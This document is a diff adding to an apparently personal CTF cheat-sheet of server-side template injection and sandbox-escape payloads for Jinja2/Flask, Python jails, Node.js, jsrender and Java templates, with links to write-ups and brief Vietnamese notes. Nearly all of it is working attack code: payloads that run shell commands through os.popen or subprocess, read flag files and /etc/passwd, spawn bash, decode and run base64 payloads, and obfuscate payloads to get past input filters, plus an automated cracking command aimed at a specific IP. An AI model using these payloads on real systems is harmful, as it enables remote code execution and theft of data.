@@ -1,10 +1,22 @@
+https://github.com/Marven11/Fenjing
+pip install fenjing
+python3 -m fenjing crack --url 'http://34.124.244.195:1338/' --method GET --inputs "c"
+$>> cat /app/flag.txt
+
+https://hackmd.io/@onsra03/SkiBeaed3#Flag-Holder
 Không nhất thiết phải SSTI để RCE mà dùng coi có thể tận dụng đc gì khác không như bài này
 Flag Holder
 https://hackmd.io/@onsra03/SkiBeaed3
+https://blog.efiens.com/post/doublevkay/ptitctf2020-writeups/
+{{config}}
 -----------------------------------------python
-__import__('pty').spawn('/bin/bash')
+https://nhattruong.blog/2021/12/25/write-up-christctf-ptit/
+eval("__import__('o'+'s').po"+"pen('cat FL4G.txt').read()")
 python -c '__import__('os').system('echo -n <base64-code> | base64 | bash')'
-https://podalirius.net/en/ctf-writeups/fcsc-2021-intro-snake/
+https://podalirius.net/en/writeups/fcsc2021-intro-snake/
+__import__('pty').spawn('/bin/bash')
+https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/
+{{ ''.__class__.mro()[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}
 
 https://flask.palletsprojects.com/en/2.0.x/templating/
 request.args.name
@@ -13,6 +25,7 @@ request.headers.name
 request.values.name
 request.form.name
 https://hackmd.io/@Chivato/HyWsJ31dI
+https://viblo.asia/p/server-side-template-injection-vulnerabilities-ssti-cac-lo-hong-ssti-phan-3-Ny0VGjAYLPA
 https://programmer.group/ctfshow-question-brushing-diary-web-ssti-web361-372.html
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 {{request.application.__globals__.__builtins__.__import__('os').popen('Is').read()}}
@@ -21,6 +34,9 @@ https://programmer.group/ctfshow-question-brushing-diary-web-ssti-web361-372.htm
 ---------without .
 {{lipsum["__globals__"]["os"]["popen"]("ls")["read"]()}}
 {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+
+https://viblo.asia/p/server-side-template-injection-vulnerabilities-ssti-cac-lo-hong-ssti-phan-3-Ny0VGjAYLPA
+()|attr('__class__')
 
 https://hackmd.io/@onsra03/By77nbQv2#CaaS
 name={{g.pop['__global''s__'].__builtins__.eval(request.form.a)}}
@@ -36,23 +52,69 @@ name={{session.pop[request.values.a].__builtins__.exec(request.values.b)}}
 ----------------------------------without using {{}}
 {% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() == 'chiv\n' %} a {% endif %}
 {% set bla = lipsum.__globals__['os'].popen('ls / > /home/service/static/output.txt').read() %}
-
+----------------------------------filter request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#
+https://cp04042k.github.io/posts/cai-ssti-nay-chill-phet/
+{{cycler.__init__.__globals__.os.popen(cycler.__doc__[[[],[],[]].__len__()]+cycler.__init__.__globals__.os.__doc__[[[],[],[],[],[],[],[],[],[],[]].__len__()]).read()}}
+---------------------------------filer ['import', 'request', 'init', '_', 'b', 'lipsum', 'os', 'globals', 'popen', 'mro', 'cycler', 'joiner', 'u','x','g','args', 'get_flashed_messages', 'base', '[',']','builtins', 'namespace', 'self', 'url_for', 'getitem','.','eval','update','config','read','dict']
+c="()|attr('\137\137class\137\137')|attr('\137\137\142ase\137\137')|attr('\137\137s\165\142classes\137\137')()|attr('\137\137getitem\137\137')(456)('cat /etc/passwd',shell=1,stdout=-1)|attr('comm\165nicate')()|attr('\137\137getitem\137\137')(0)|attr('decode')()"
+d='''"foo"|attr('\137\137\143\154\141\163\163\137\137')|attr('\137\137\142\141\163\145\137\137')|attr('\137\137\163\165\142\143\154\141\163\163\145\163\137\137')()|attr('\137\137\147\145\164\151\164\145\155\137\137')(367)|attr('\137\137\151\156\151\164\137\137')|attr('\137\137\147\154\157\142\141\154\163\137\137\133'sys'\133')|attr('\155\157\144\165\154\145\163\133\47\157\163\47\135')|attr('\160\157\160\145\156("ls")')|attr('\162\145\141\144')()'''
+e='''{% set m,l,m,m,m,m,m,m,m,m,m,m,p,m,m,m,m,m,m,m,m,m,m,m,m,m,m,a,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m,m = (()|select()|lower|list()) %} {% set q = a2~"class"~a2 %} {% set h = a2~p~"ase"~a2%} {% set ll = a2 ~ l ~ "etitem" ~ a2%}{% set ii =  a2~"i"~"nit"~a2%} {% set hhh = a2~l~"lo"~p~"als"~ a2%}{% set d = ('%c'|format(46)) %} {%set ee = "ev"~"al"%}{%set com = a2~"im"~"port"~a2~"('o"~"s')"~d~"po"~"pen('cat fl*')"~d~"re"~"ad()" %}{{ ()|attr(q)|attr(h)|attr('%c%c%c%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(ll)(137)|attr(ii)|attr(hhh)|attr(ll)('%c%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,98,117,105,108,116,105,110,115,95,95))|attr(ll)(ee)(com)}}'''
 ------------------------------------------filter word
 {{['Thi','s wi','ll b','e appended']|join}}
 ?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read
 
+{{lipsum["__globals__"]["os"]["popen"]("echo BASE64 | base64 -d | python3")["read"]()}
 ---------------------------------other
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+
+list([].__class__.__base__.__subclasses__()[-5].__init__.__globals__.values())[47]('sh')
+#[].__class__.__base__.__subclasses__()[-5] is equal to os._wrap_close class
+#os._wrap_close.__init__.__globals__.values()[47] is equal to system function
+(𝔩:=[].__𝔠𝔩𝔞𝔰𝔰__, 𝔱:=𝔩==𝔩, 𝔩(𝔩.__𝔟𝔞𝔰𝔢__.__𝔰𝔲𝔟𝔠𝔩𝔞𝔰𝔰𝔢𝔰__()[-~𝔱*~𝔱-𝔱].__𝔦𝔫𝔦𝔱__.__𝔤𝔩𝔬𝔟𝔞𝔩𝔰__.𝔳𝔞𝔩𝔲𝔢𝔰())[~𝔱*~𝔱*~𝔱*𝔱*~𝔱*~𝔱*~𝔱-~𝔱*~𝔱*~𝔱*~𝔱-𝔱](𝔱.__𝔡𝔬𝔠__[~𝔱*~𝔱*~𝔱*~𝔱+~𝔱*-~𝔱*~𝔱-𝔱:-~𝔱*~𝔱*~𝔱*~𝔱*~𝔱:-~𝔱*~𝔱*~𝔱]))
+https://yaytext.com/fraktur/
+~1 == -2
+
+https://github.com/daffainfo/ctf-writeup/blob/main/1337UP%20LIVE%20CTF/PyJail/README.md
+breakpoint()
+__import__("os").system("echo 1")
+
+i=input;p=print;e=eval;e(i());
+__import__('os').system('/bin/bash')
 -----------------------------------------blind output
 https://hackmd.io/@to016/imaginaryCTF2022 -- minigolf
 ---example https://hackmd.io/@Trumpiter/basicvulnweb
+{% set x = config.update(g=request.args.a) %}
+{% print config.l|attr(config.g) %}
+----------------------------other
+https://hackmd.io/@CP04042K/HydCd1Tm6
+import("child_process").then(mod => mod.execSync('calc'))
+process.binding('spawn_sync').spawn({
+    file: '/usr/bin/id',
+    args: [
+        '/usr/bin/id'
+    ],
+    stdio: [
+        {type:'pipe',readable:true,writable:false},
+        {type:'pipe',readable:false,writable:true},
+        {type:'pipe',readable:false,writable:true}
+    ]}
+).output.toString()
+
+https://github.com/opabravo/security-writeups/blob/main/ctf/2023-11-17%20Intigriti%201337up%20CTF%202023.md
+customer_name=x%0a{{lipsum.__globals__["os"].popen(request.headers.get("X")).read()}}
 ----------------------------------------------------------NODEJS
 <%=JSON.stringify(process)%>  kiểm tra giá trị process
 https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet
 https://hackmd.io/@endy/rJdvqhUwn
 {% print([].__class__.__mro__[1].__subclasses__()[394]('nl flag.txt',shell=True,stdout=-1).communicate()[0])%}.txt
+https://hackmd.io/@CP04042K/ryyqJeXx2#Orbital
+jsrender.templates(`${usernames}`).render()   #recorgnize
+{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
 ----------------------------------------------------------payload
 {{['ls']|map('system')|join}}
 --------------------------------------------------java
 #set ($e="bla")
 $e.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
+#--------------------------------------------bypass filter
+https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+""["class"].forName("java.lang.Runtime")
